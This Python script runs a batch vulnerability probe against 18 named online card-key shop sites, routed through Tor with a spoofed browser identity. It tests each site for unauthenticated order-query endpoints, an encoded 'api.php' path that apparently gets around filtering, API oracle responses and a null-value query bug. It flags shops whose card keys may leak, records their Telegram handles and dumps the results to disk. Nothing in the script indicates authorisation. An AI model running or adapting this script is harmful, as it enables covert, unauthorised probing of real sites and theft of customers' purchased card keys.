#!/usr/bin/env python3
"""Batch SUCCESS_CASES first-pass for 18 shops."""
import json
import re
import socket
import subprocess
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

import requests

OUT = Path("/data/recon/batch18")
(OUT / "probe").mkdir(parents=True, exist_ok=True)
(OUT / "dump").mkdir(parents=True, exist_ok=True)

TARGETS = [
    "https://qcccc888.top/shop/",
    "https://tianfei88.lol/shop/",
    "https://hu6621.cn/shop/",
    "https://xiaobei.lol/shop/",
    "https://youhui1998.top/shop/",
    "http://xdd6689.top/shop/",
    "https://dadiqq.com/shop/",
    "https://lbd.lol/shop/",
    "https://xxn7788.top/shop/",
    "https://qqbizu666.top/shop/",
    "https://qq857.cc/shop/",
    "https://tangsqq.top/shop/",
    "http://zhanghaofk88.top/shop/",
    "https://byqqdd.top/shop/",
    "https://kdyfk.top/shop/",
    "https://qqxbk.vip/",
    "https://chuhao.lol/shop/",
    "https://jackww.top/shop/",
]

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
PROXIES = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}


def log(*a):
    print(*a, flush=True)


def host_of(url: str) -> str:
    return urllib.parse.urlparse(url).hostname


def api_base(url: str) -> str:
    p = urllib.parse.urlparse(url.rstrip("/"))
    path = p.path.rstrip("/") or ""
    return f"https://{p.hostname}{path}"


def dns_ips(host: str):
    try:
        return sorted(set(x[4][0] for x in socket.getaddrinfo(host, None)))
    except Exception as e:
        return [f"err:{e}"]


def session(origin: str, referer: str):
    s = requests.Session()
    s.proxies.update(PROXIES)
    s.verify = False
    requests.packages.urllib3.disable_warnings()
    s.headers.update(
        {
            "User-Agent": UA,
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Origin": origin,
            "Referer": referer,
        }
    )
    return s


def get(s, url, timeout=25, **kw):
    try:
        r = s.get(url, timeout=timeout, allow_redirects=True, **kw)
        return r.status_code, r.text, r.url
    except Exception as e:
        return None, str(e), url


def curl61(base_https: str, qs: str) -> str:
    host = urllib.parse.urlparse(base_https).hostname
    # root shops: base_https may be https://host with empty path
    base = base_https.rstrip("/") or f"https://{host}"
    url = f"{base}/%61pi.php?{qs}"
    cmd = [
        "curl", "-sS", "-m", "18", "-L",
        "-x", "socks5h://127.0.0.1:9050",
        "-A", UA,
        "-H", f"Origin: https://{host}",
        "-H", f"Referer: {base}/",
        url,
    ]
    p = subprocess.run(cmd, capture_output=True, text=True, timeout=25)
    return (p.stdout or p.stderr or "")[:300]


def probe_one(url: str) -> dict:
    host = host_of(url)
    origin = f"https://{host}"
    shop = api_base(url)
    row = {
        "target": url,
        "host": host,
        "shop": shop,
        "ips": dns_ips(host),
        "cases": {},
        "interesting": [],
        "kami_hint": False,
    }
    s = session(origin, shop + "/")

    code, text, final = get(s, shop + "/", timeout=40)
    if (code in (None, 404) or len(text or "") < 300) and shop.endswith("/shop"):
        # try root for mislisted shop paths
        root = f"https://{host}"
        code2, text2, final2 = get(s, root + "/", timeout=40)
        if code2 == 200 and len(text2 or "") > len(text or ""):
            code, text, final = code2, text2, final2
            shop = root
            s.headers["Referer"] = shop + "/"

    title = (re.search(r"<title>([^<]+)", text or "") or [None, None])[1]
    row["home"] = {
        "code": code,
        "final": final,
        "len": len(text or ""),
        "title": title,
        "rainbow": any(x in (text or "") for x in ["mod=buy", "mod=query", "hashsalt", "assets/js/csrf.js"]),
        "ykfaka": any(x in (text or "") for x in ["Query.html", "YKFAKA", "Query_Km"]),
        "tg": sorted(set(re.findall(r"t\.me/[\w]+|@[A-Za-z][\w]{3,}", text or "")))[:12],
    }
    safe = re.sub(r"[^a-zA-Z0-9._-]+", "_", url)
    if text and len(text) > 500:
        (OUT / "probe" / f"home_{safe}.html").write_text(text, encoding="utf-8")

    s.headers["Referer"] = shop + "/"
    s.headers["Origin"] = origin

    c, t, _ = get(
        s,
        shop + "/ajax.php?act=getcount",
        headers={"X-Requested-With": "XMLHttpRequest"},
        timeout=25,
    )
    row["cases"]["getcount"] = {"code": c, "body": (t or "")[:300]}
    try:
        j = json.loads(t)
        row["cases"]["getcount"]["json"] = j
        if isinstance(j, dict) and j.get("code") == 0:
            row["yxts"] = j.get("yxts")
            row["orders"] = j.get("orders")
    except Exception:
        pass

    c, t, _ = get(
        s,
        shop + "/ajax.php?act=query&page=1",
        headers={"X-Requested-With": "XMLHttpRequest"},
        timeout=25,
    )
    row["cases"]["ajax_query"] = {"code": c, "body": (t or "")[:400]}
    if t and '"data":[{' in t:
        row["interesting"].append("ajax_query_has_data")
        row["kami_hint"] = True
    elif c == 200 and '"data":[]' in (t or ""):
        row["ajax_empty"] = True

    c, t, _ = get(s, shop + "/?mod=query&data=1", timeout=35)
    hits = []
    for pat in [r"showOrder", r"mod=faka", r"没有查询到", r"卡密[^<]{0,60}", r"查询结果"]:
        m = re.search(pat, t or "", re.I)
        if m:
            hits.append(m.group(0)[:80])
    row["cases"]["qd93"] = {"code": c, "len": len(t or ""), "hits": hits}
    if "showOrder" in (t or "") or "mod=faka" in (t or ""):
        row["interesting"].append("qd93_possible")
        row["kami_hint"] = True

    api = {}
    for label, qs in [
        ("search", "act=search&id=1"),
        ("tools_empty", "act=tools&key="),
        ("tools_bad", "act=tools&key=123456&limit=1"),
        ("goodslist", "act=goodslist"),
    ]:
        body = curl61(shop, qs)
        api[label] = body
        time.sleep(0.2)
    row["cases"]["api61"] = api

    search = api.get("search") or ""
    try:
        sj = json.loads(search)
        sm = sj.get("message") or sj.get("msg") or ""
    except Exception:
        sm = search
    if "请提供用户登录信息或API对接密钥" in search or "请提供用户登录信息或API对接密钥" in str(sm):
        row["api_search_auth"] = True
    elif "订单不存在" in search or "订单不存在" in str(sm) or "\\u8ba2\\u5355\\u4e0d\\u5b58\\u5728" in search:
        row["api_search_open"] = True
        row["interesting"].append("api_search_open")
    if "确保各项不能为空" in (api.get("tools_empty") or "") and "错误" in (api.get("tools_bad") or ""):
        row["tools_oracle"] = True

    # YKFAKA quick
    for root in [shop, re.sub(r"/shop$", "", shop)]:
        if not root or root.endswith("://"):
            continue
        try:
            r = s.post(
                root + "/index.php?m=Home&c=Order&a=query",
                data={"value": "null"},
                timeout=15,
            )
            km = len(re.findall(r"Query_Km", r.text))
            if km:
                row["interesting"].append("yk_null_live")
                row["kami_hint"] = True
        except Exception:
            pass

    log(
        "DONE",
        url,
        "|",
        (title or "")[:36],
        "| yxts=",
        row.get("yxts"),
        "orders=",
        row.get("orders"),
        "| ajax=",
        row["cases"]["ajax_query"].get("code"),
        "| search=",
        (search[:55] if search else "").replace("\n", " "),
        "| interest=",
        row["interesting"],
        "| kami=",
        row["kami_hint"],
    )
    return row


def main():
    results = []
    with ThreadPoolExecutor(max_workers=2) as ex:
        futs = {ex.submit(probe_one, u): u for u in TARGETS}
        for fut in as_completed(futs):
            u = futs[fut]
            try:
                results.append(fut.result())
            except Exception as e:
                log("FAIL", u, e)
                results.append({"target": u, "error": str(e)})

    order = {u: i for i, u in enumerate(TARGETS)}
    results.sort(key=lambda r: order.get(r.get("target"), 999))

    summary = []
    for r in results:
        summary.append(
            {
                "target": r.get("target"),
                "title": (r.get("home") or {}).get("title"),
                "ips": r.get("ips"),
                "yxts": r.get("yxts"),
                "orders": r.get("orders"),
                "ajax_query_code": (r.get("cases") or {}).get("ajax_query", {}).get("code"),
                "api_search": ((r.get("cases") or {}).get("api61", {}) or {}).get("search", "")[:90],
                "tools_oracle": r.get("tools_oracle"),
                "interesting": r.get("interesting"),
                "kami_hint": r.get("kami_hint"),
                "tg": (r.get("home") or {}).get("tg"),
            }
        )

    (OUT / "dump" / "BATCH.json").write_text(
        json.dumps(results, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    (OUT / "dump" / "SUMMARY.json").write_text(
        json.dumps(summary, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    log("==== SUMMARY ====")
    for srow in summary:
        log(
            srow["target"],
            "| yxts=",
            srow.get("yxts"),
            "orders=",
            srow.get("orders"),
            "| ajax=",
            srow.get("ajax_query_code"),
            "| interest=",
            srow.get("interesting"),
            "| kami=",
            srow.get("kami_hint"),
        )
    log("WROTE")


if __name__ == "__main__":
    main()
